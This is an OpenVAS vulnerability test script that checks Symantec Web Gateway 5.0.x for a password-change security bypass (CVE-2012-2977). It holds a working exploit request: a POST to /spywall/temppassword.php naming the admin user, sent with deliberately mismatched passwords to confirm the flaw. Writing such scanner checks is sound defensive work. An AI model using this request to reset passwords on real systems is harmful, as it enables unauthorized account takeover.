###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_symantec_web_gateway_54430.nasl 11425 2018-09-17 09:11:30Z asteins $
#
# Symantec Web Gateway Password Change Security Bypass Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################
CPE = "cpe:/a:symantec:web_gateway";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103547");
  script_bugtraq_id(54430);
  script_cve_id("CVE-2012-2977");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_version("$Revision: 11425 $");

  script_name("Symantec Web Gateway Password Change Security Bypass Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54430");
  script_xref(name:"URL", value:"http://www.symantec.com/business/web-gateway");

  script_tag(name:"last_modification", value:"$Date: 2018-09-17 11:11:30 +0200 (Mon, 17 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-08-22 10:26:36 +0200 (Wed, 22 Aug 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_symantec_web_gateway_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("symantec_web_gateway/installed");
  script_tag(name:"solution", value:"Vendor updates are available. Please see the references for more
information.");
  script_tag(name:"summary", value:"Symantec Web Gateway is prone to a security-bypass vulnerability.");

  script_tag(name:"impact", value:"Successful exploits may allow attackers to change another user's
password allowing them to gain unauthorized access in the context of
the affected user. This may aid in further attacks.");

  script_tag(name:"affected", value:"Symantec Web Gateway versions 5.0.x.x are vulnerable.");

  script_tag(name:"solution_type", value:"VendorFix");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");


if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

pass  = "A,3$" + rand();
pass1 = "B,4$" + rand();
host = http_host_name(port:port);

ex = "USERNAME=admin&password2=" + pass  + "&password=" + pass1  + "&Save=Save&target=executive_summary.php";
len = strlen(ex);

req = string("POST /spywall/temppassword.php HTTP/1.1\r\n",
             "Accept-Encoding: identity\r\n",
             "Content-Length: ",len,"\r\n",
             "Host: ",host,"\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Connection: close\r\n",
             "\r\n",
             ex);

data = http_send_recv(data:req,port:port);

if("You have logged in using a temporary password" >< data && "Please select a new one" >< data && "Password doesn't match the retyped password" >< data) {

  security_message(port:port);
  exit(0);

}
